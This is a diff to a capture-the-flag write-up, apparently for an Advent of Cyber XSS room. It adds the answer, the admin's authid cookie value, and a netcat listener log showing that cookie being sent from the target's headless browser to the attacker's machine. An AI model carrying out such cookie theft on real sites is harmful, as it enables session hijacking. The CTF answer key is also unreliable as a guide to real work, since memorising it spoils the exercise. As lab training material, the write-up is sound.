@@ -37,15 +37,9 @@ P.S. If you want to learn more about XSS, we have a room where you can learn abo
 <h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
 
 > 1.1. <em>What is the admin's authid cookie value?</em><br><a id='1.1'></a>
->> <code><strong>____________1</strong></code><br><br>
+>> <code><strong>2564799a4e6689972f6d9e1c7b406f87065cbf65</strong></code><br><br>
 
 <br>
-
-<pre><code>$  
-
-
-</code></pre>
-
 
 
 <h3 align="center">Accessed the machine at http://[Target]:3000.<br>
@@ -78,6 +72,21 @@ P.S. If you want to learn more about XSS, we have a room where you can learn abo
                  <img width="900px" src="https://github.com/user-attachments/assets/2d0b24ea-3686-4802-b12d-3e48cb3b02e4">
                  <img width="900px" src="https://github.com/user-attachments/assets/ea7e4a82-7c3d-4758-b6f2-e947c720e276"></h3>
 
+<br>
+
+<pre><code>$root@[AttackBox]:~/AdventOfCyber2019# nc -lvnp 4242
+Listening on 0.0.0.0 4242
+Connection received on [Target] 47950
+GET /page?param=authid=2564799a4e6689972f6d9e1c7b406f87065cbf65 HTTP/1.1
+Host: [AttackBox]:4242
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://localhost:3000/admin
+Accept-Encoding: gzip, deflate
+
+</code></pre>
 
 
 
